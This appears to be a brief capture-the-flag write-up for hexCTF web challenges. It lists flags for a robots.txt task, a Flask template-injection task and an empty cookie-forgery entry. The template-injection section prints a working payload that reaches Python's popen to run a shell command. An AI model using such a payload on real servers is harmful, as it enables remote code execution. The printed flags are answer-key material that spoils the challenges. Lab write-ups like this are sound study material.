# Web

## Well known

1. robots.txt

> hexCTF{th4nk_y0u_liv3_0v3rfl0w}

## Notes

1. Flask模板注入

```
{{config.__class__.__mro__[2].__subclasses__()[117].__init__.__globals__['popen']('cat flag').read()}}

/notes
```

> hexCTF{d0nt_r3nder_t3mplates_w1th_u5er_1nput}

## JACC

1. Flask Cookie伪造

```

```